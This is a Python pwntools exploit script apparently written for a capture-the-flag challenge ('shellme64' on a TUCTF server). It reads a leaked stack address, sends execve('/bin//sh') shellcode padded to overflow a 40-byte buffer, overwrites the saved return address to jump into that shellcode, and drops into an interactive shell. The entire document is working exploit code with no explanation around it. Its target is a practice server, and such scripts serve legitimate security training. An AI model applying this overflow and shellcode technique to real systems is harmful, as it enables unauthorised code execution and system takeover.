#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'

def get_shellcode():
    # Reference: https://www.exploit-db.com/exploits/41883
    sc = b""
    sc += b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
    return sc

def generate_payload(stack_addr):
    sc = get_shellcode()

    payload = b""
    payload += sc
    payload += b"A"*(40 - len(sc))
    payload += p64(stack_addr) # rip 
    return payload

def main():
    #target = process("./shellme64")
    target = remote("chal.tuctf.com", 30507)

    target.recvuntil("Hey! I think you dropped this\n")

    leaked_stack_addr = int(target.recvline().rstrip().decode("utf-8"), 16)
    print(leaked_stack_addr)
    print(type(leaked_stack_addr))

    prompt = target.recvuntil(b"> ")

    payload = generate_payload(leaked_stack_addr)
    print(payload)
    target.sendline(payload)

    target.interactive()

main()
